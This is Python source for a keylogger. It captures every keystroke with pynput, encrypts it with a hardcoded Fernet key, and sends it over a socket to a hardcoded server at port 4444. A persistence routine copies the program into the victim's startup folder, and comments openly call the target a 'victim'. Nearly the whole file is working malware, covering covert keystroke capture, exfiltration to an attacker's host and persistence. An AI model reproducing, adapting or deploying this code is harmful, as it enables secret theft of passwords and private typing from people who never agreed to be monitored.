from pynput.keyboard import Listener # allow python program to monitor keystrokes from keyboard
import socket # for network communication
from cryptography.fernet import Fernet # Fernet library, uses synmetric key for encrypting and decrypting
import sys # for interacting with Python Interpreter 
import manipulate # used manipulate.py script to copy keylogger script to startup folder

class Keylogger():

	def __init__(self, Host, Port, crypt_key):

		self.__Host = Host
		self.__Port = Port
		self.client = None	# socket object
		self.client_connected = False # set to True, if we successfully connected to the Server via socket
		self.fail = False # set to True, if the inittial connection attempt failed
		self.__crypt = Fernet(crypt_key) # Fernet secret key object for encryption

		# filter out specials characters for clean input and logs
		self.__key_to_discard = [

			"Key.esc", "Key.ctrl", "Key.alt",
			"Key.shift", "Key.caps_lock", "Key.backspace",
			"Key.tab", "Key.right", "Key.ctrl_l", "Key.alt_l",
			"Key.cmdr", "Key.cmd"

		]

	def connect_server(self):

		try:
			# creating socket
			self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			Address = (self.__Host, self.__Port)
			# connect to the Server
			self.client.connect(Address)
			print(f"Connected to {self.__Host}:{self.__Port}")
			self.client_connected = True
		
		 	# ConnectionRefusedError occurs when client attempt to connect to Server
			# but the Server is not on and incorrect Server IP and Port
		except ConnectionRefusedError:

			print("Could not connect to the Server")
			print("Make sure the Server is listening for connection...")
			
			self.fail = True

		# Method for copying executable program to victim startup folder 
	def persistance(self):
		
		manipulate.path_manipulation()

	  # Method for sending keystrokes to Server via socket
	def write_to_server(self, key):

		keystroke = str(key)
		keystroke = keystroke.replace("'",'')

		if keystroke == "Key.space":
			keystroke = " " # for spacing
		elif keystroke == "Key.enter":
			keystroke = "\n"	# for indenting
		elif keystroke in self.__key_to_discard:
			keystroke = ""	# filtering special keystrokes

		if keystroke: 

			# encode key strings into bytes and encrypt it after
			byte_msg = self.__crypt.encrypt(keystroke.encode('utf-8'))

			if self.client_connected:

				try: 
						
						# send the encrypted logs
						self.client.sendall(byte_msg)

					# ConnectionResetError, occurs when remote Server forcibly closed the connection
					# BrokenPipeError, occurs when attemtping to write data to a socket that has been closed
					# ConnectionAbortedError, exclusively for Window, Remote Server close the connection
				except (ConnectionResetError, BrokenPipeError, ConnectionAbortedError):
						
						print("\nServer has been disconnected")
						# closing the socket to free up resources
						self.client.close()
						
						self.client_connected= False

						return False # intended to stop the Listner()
				

if __name__ == '__main__':
	
	Host = "192.168.1.39" # Server IP
	Port = 4444   # Server Port
	KEY = b"GLpnLBTkUsqcwT5TYpMgQT0c-W_Ust13ybM3ZK5whj8=" # keys for encrypting
	victim = Keylogger(Host, Port, KEY)	

	victim.persistance()
	victim.connect_server()

	# terminate the program, if the initial connection failed
	if victim.fail: 

		print("The program is now being terminated")
		
		sys.exit(1)

	try:

			# initilize the listener function
			# on_press is a callback function, it invoked everytime a key is pressed

			with Listener(on_press=victim.write_to_server) as l:

			# join() block the program, to keep listening for keystrokes, until the the function return False
				l.join()

			#	Manual termination
	except KeyboardInterrupt:

				print("Program has been terminated")


